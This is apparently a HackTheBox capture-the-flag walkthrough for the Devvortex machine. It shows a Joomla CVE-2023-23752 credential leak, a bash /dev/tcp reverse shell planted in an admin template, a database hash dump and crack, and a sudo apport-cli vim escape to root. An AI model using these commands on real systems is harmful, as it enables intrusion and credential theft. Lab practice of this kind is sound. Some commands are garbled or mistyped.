## HackTheBox Devvortex walkthrough ##<br>
<br>
Update hosts file, add devvortex IP:<br>
```vi /etc/hosts```<br>
<br>
Reconnaissance by network scan:<br>
```nmap -sV gives devvortex.htb```<br>
<br>
This shows a web service on port 80. The service is a CMS.<br>
<br>
Use gobuster to enumerate sub domains:<br>
```wget https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-20000.txt```<br>
<br>
```gobuster dns -d devvortex.htb -w $wordlists/dns/subdomains-top1million-20000.txt -t 20```<br>
<br>
Enumeration reveals dev.devvortex.htb.<br>
<br>
Add this URL to the hosts file.<br>
<br>
Access dev.devvortex.htb/readme.txt <br>
<br>
This is a joomla site.<br>
<br>
Joomla is vulnerable to Improper Access Check CVE-2023-23752 which exposes credentials<br>
<br>
```curl -v http://10.9.49.205/api/index.php/v1/config/application?public=true```<br>
<br>
Login to the Joomla admin area using CVE-2023-23752 output:<br>
username: <hidden><br>
password: <hidden><br>
<br>
Go to System -> System Information<br>
<br>
This gives some useful information.<br>
<br>
Go to System -> Templates -> Administrator Templates<br>
Open Template<br>
Open index.php<br>
<br>
Add reverse shell code:<br>
```exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.1/4444 0>&1'");```<br>
<br>
Start reverse shell:<br>
```nc -lvnp 4444```<br>
<br>
Save the template page. Reverse shell is established.<br>
<br>
Use the following commands to make the shell more accessible:<br>
```script /dev/null -c /bin/bash<br>
CTRL + Z<br>
stty raw -echo; fg<br>
Then press Enter twice, and then enter:<br>
export TERM=xterm```<br>
<br>
Since this is a Joomla CMS it has a database. In this case MySQL.<br>
<br>
Access the database and output the user table:<br>
```mysql -u lewis -p<br>
show databases;<br>
use joomla;<br>
select username,password from sd4fg_users;```<br>
<br>
This reveals a hashed password for user: <hidden> which can be cracked:
<br>
cp password to logan.txt<br>
```
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt<br>
john --format=bcrypt --wordlist=/usr/share/seclists/passwords/rockyou.txt logan.txt```<br>
<br>
Password is <hidden><br>
<br>
```ssh <hidden>:<hidden>```<br>
<br>
Get the user flag:<br>
```less user.txt```<br>
<br>
Time to get root. List the processes which can use sudo:<br>
<br>
```
sudo -l <br>
```<br>
One service is: /usr/bin/apport-cli<br>
<br>
Run the command:<br>
```/usr/bin/apport-cli```<br>
<br>
Reports are generated using vim. Execute code in VIM:<br>
<br>
Select: Create a report<br>
<br>
Use the following options:<br>
```1<br>
2<br>
!/bin/bash```<br>
<br>
This gives a root shell. Open root flag:<br>
```less /root/user.txt```<br>

